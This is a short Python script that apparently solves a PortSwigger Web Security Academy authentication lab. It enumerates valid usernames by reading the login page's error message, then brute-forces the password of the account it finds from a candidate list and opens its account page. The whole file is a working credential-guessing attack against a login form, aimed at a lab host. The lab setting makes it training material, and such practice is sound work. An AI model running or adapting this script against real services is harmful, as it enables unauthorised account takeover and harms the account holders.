import requests
from bs4 import BeautifulSoup

if __name__ == '__main__':
    s = requests.Session()

    site = 'ace91f731fc181eac0a5333400d000d2.web-security-academy.net'
    login_url = f'''https://{site}/login'''
    lines = open("auth-lab-usernames", "r").readlines()

    atkTarget = ""

    for user in lines:
        target = user.strip()
        logindata = {
            'username': target,
            'password': 'foo'
        }
        resp = s.post(login_url, data=logindata)
        soup = BeautifulSoup(resp.text, 'html.parser')
        warning = soup.find('p', {'class': 'is-warning'})
        warning_text = warning.text if warning is not None else "username"
        if 'username' not in warning_text:
            atkTarget = target
            print(f'username is {target}')
            break

    passwords = open("candidate-lab-passwords", "r").readlines()
    for password in passwords:
        pw = password.strip()
        loginData = {
            'username': atkTarget,
            'password': pw
        }
        resp = s.post(login_url, data=loginData)
        soup = BeautifulSoup(resp.text, 'html.parser')
        if 'Incorrect password' not in resp.text:
            s.get(f'https://{site}/my-account?id={atkTarget}')
            print("Password: ", pw)
